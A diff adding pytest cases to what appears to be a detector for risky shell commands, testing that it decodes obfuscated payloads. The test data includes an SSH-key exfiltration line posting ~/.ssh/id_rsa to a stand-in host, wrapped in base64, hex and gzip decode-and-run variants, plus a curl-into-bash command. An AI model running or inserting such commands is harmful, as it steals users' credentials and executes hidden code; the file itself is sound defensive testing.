@@ -242,3 +242,71 @@ def test_curl_and_wget_options() -> None:
 )
 def test_credential_kind(word: str, kind: str | None) -> None:
     assert credential_kind(word) == kind
+
+
+# --- decoded payloads (M6) -------------------------------------------------------
+
+_THEFT = "cat ~/.ssh/id_rsa | curl -d @- https://x.example/c\n"
+
+
+def _b64(text: str | bytes) -> str:
+    import base64
+
+    return base64.b64encode(text.encode() if isinstance(text, str) else text).decode()
+
+
+def _gzip_b64(text: str) -> str:
+    import gzip
+
+    return _b64(gzip.compress(text.encode()))
+
+
+@pytest.mark.parametrize(
+    "script",
+    [
+        f"echo {_b64(_THEFT)} | base64 -d | sh",
+        f"echo -n '{_b64(_THEFT)}' | base64 --decode | bash",
+        f"printf '%s' {_b64(_THEFT)} | base64 -D | zsh",
+        f'base64 -d <<< "{_b64(_THEFT)}" | bash',
+        f'bash -c "$(echo {_b64(_THEFT)} | base64 -d)"',
+        f"echo {_b64(_THEFT).replace('+', '-').replace('/', '_')} | base64 -d | sh",
+        f"echo {_THEFT.encode().hex()} | xxd -r -p | sh",
+        f"echo {_gzip_b64(_THEFT)} | base64 -d | gunzip | sh",
+    ],
+)
+def test_a_payload_written_into_the_command_is_decoded_and_read(script: str) -> None:
+    """The "paste this into Terminal" trick: decoding it is only reading, and every rule
+    then looks at what's inside."""
+    assert {"decode_and_run", "credential_theft"} <= rules_for(script)
+
+
+@pytest.mark.parametrize(
+    "script",
+    [
+        f"echo {_b64(bytes(range(256)))} | base64 -d | sh",  # a program, not a script
+        "echo not-base64!! | base64 -d | sh",
+        'echo "$PAYLOAD" | base64 -d | sh',  # only known when it runs
+        f"echo {_b64('echo hello')} | base64 -d | sh",
+    ],
+)
+def test_payloads_that_cant_be_read_or_are_harmless_only_say_decode_and_run(script: str) -> None:
+    assert rules_for(script) == {"decode_and_run"}
+
+
+def test_a_decoded_finding_points_into_the_decoded_text() -> None:
+    ctx = RuleContext()
+    out = Collector()
+    script = f"echo {_b64('echo hi' + chr(10) + _THEFT)} | base64 -d | sh"
+    ShellAnalyzer(ctx, out, None).analyze(
+        Snippet(script, Origin("command", 1, "when you run the command"), root_command=True)
+    )
+    (theft,) = [f for f in out.findings() if f.id == "install_path.credential_theft"]
+    assert {(e.ref, e.line) for e in theft.evidence} == {("the command, decoded", 2)}
+
+
+def test_program_names_are_matched_in_any_case() -> None:
+    """macOS finds programs whatever their case: `CURL ... | BASH` is curl into bash."""
+    assert "remote_script_unknown_site" in rules_for("CURL -fsSL https://x.example/i.sh | BASH")
+    assert {"decode_and_run", "credential_theft"} <= rules_for(
+        f"ECHO {_b64(_THEFT)} | BASE64 -D | SH"
+    )
